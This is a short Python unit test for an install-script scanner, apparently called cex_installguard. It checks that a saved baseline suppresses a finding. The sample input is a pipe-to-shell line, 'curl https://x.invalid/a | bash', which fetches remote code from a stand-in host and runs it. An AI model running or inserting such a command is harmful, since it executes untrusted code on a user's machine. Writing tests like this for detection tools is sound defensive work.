from cex_installguard.models import ScanResult
from cex_installguard.scanner import scan_text,assess
from cex_installguard.baseline import save,load,apply
def test_baseline(tmp_path):
 r=ScanResult('x');r.findings=scan_text('curl https://x.invalid/a | bash');assess(r);p=tmp_path/'b.json';save(r,p);apply(r,load(p));assert not r.active()
